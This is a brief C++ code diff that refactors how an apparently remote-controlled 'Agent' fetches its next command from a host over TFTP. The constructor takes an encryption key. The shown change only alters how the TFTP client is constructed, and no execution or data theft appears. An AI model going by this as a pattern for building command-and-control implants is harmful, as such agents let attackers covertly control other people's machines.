@@ -12,8 +12,7 @@ Agent::Agent(std::string host,  std::string encryptionKey, uint16_t port)
 
 std::string Agent::GetCommand()
 {
-    UdpSocket sock;
-    TFTPClient client(&sock, m_host, m_port);
+    TFTPClient client(m_host, m_port);
     
     std::vector<BYTE> command;
     TFTPClient::Status status = client.Get(command, TFTPClient::GetDownloadedDefaultFName()); 
